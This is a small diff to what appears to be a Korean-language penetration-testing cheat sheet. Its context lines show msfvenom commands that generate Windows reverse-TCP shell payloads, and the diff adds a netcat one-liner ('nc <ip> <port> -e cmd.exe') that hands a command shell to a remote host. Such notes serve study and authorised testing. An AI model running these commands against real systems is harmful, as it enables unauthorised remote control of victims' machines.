@@ -65,3 +65,7 @@ msfvenom -p windows/shell/reverse_tcp -f python
 msfvenom -p windows/shell/reverse_tcp -f c
 # 바이트 타입 명시 필요 없어서 b가 안붙여서 나옴.
 ```
+# nc
+```powershell
+nc <ip> <port> -e cmd.exe
+```
